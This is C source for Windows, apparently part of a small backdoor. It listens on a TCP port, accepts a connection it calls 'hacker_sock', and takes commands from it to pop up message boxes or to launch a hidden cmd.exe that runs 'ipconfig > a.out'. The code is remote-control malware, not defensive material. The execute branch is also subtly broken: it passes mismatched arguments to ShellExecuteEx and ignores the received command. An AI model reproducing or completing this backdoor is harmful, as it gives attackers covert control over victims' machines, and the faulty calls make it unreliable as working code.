#include <stdio.h>
#include <tchar.h>
#include <ws2tcpip.h>

#include "Server.h"
#include "Tools.h"

#pragma comment(lib, "Ws2_32.lib")

SOCKET InitServer()
{
	INT     iResult = 0;
	WSADATA wsaData;
	if (iResult = WSAStartup(MAKEWORD(2, 2), &wsaData)) 
	{
		printf("WSAStartup failed with error: %d\n", iResult); 

		return INVALID_SOCKET;
	}

	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family   = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags    = AI_PASSIVE;

	struct addrinfo *result = NULL;
	if (iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result)) 
	{
		printf("getaddrinfo failed with error: %d\n", iResult);

		WSACleanup(); 

		return INVALID_SOCKET;
	}

	SOCKET listen_sock = INVALID_SOCKET; 
	if ((listen_sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol)) == INVALID_SOCKET) 
	{
		printf("socket failed with error: %ld\n", WSAGetLastError());

		freeaddrinfo(result);
		WSACleanup(); 

		return INVALID_SOCKET;
	}

	if (bind(listen_sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) 
	{
		printf("bind failed with error: %d\n", WSAGetLastError());

		freeaddrinfo(result);
		closesocket(listen_sock);
		WSACleanup(); 

		return INVALID_SOCKET;
	}

	freeaddrinfo(result);

	if (listen(listen_sock, SOMAXCONN) == SOCKET_ERROR) 
	{
		printf("listen failed with error: %d\n", WSAGetLastError());

		closesocket(listen_sock);
		WSACleanup();

		return INVALID_SOCKET;
	}

	return listen_sock;
}

VOID RunServer(SOCKET listen_sock)
{
	TCHAR  cmd[CMD_LENGTH + 1]    = { 0 }, // (cmd + space) + '\0'
		  args[MAX_BUFFER_LENGTH] = { 0 };
	while (TRUE)
	{
		SOCKET hacker_sock = INVALID_SOCKET; 
		if ((hacker_sock = accept(listen_sock, NULL, NULL)) == INVALID_SOCKET)
		{
			printf("accept failed with error: %d\n", WSAGetLastError());

			closesocket(listen_sock);

			WSACleanup(); 
			return;
		}

		_tprintf("Connected\n");
		while (TRUE)
		{
			int bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
			recv(hacker_sock, args, ARGS_LENGTH, 0);

			if (!bytes || bytes == SOCKET_ERROR)
				break;

			_tprintf("cmd:'%s', args:'%s'\n", cmd, args);
			switch (cmd[0])
			{
			case MESSAGE:
				MessageBoxExA(NULL, args, TEXT("GG WP"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
				break;

			case EXECUTE: {
				//TCHAR buf[ARGS_LENGTH + 3] = TEXT(" /c"); // +3 for '/c'
				//strcat_s(buf, ARGS_LENGTH + 3, args);
				// SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
				// shell.fMask = SEE_MASK_NOCLOSEPROCESS;
				// shell.lpFile = "cmd.exe";
				// shell.lpParameters = "ipconfig > a.txt";
				// shell.nShow = SW_HIDE;
				// ShellExecuteEx(&shell);
				// WaitForSingleObject(shell.hProcess, INFINITE);
				ShellExecuteEx(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("ipconfig > a.out"), NULL, SW_HIDE);
				break; 
			}

			default:
				break;
			}	

			// send(hacker_sock, success, strlen(success), 0);
		}

		closesocket(hacker_sock);
	}
}
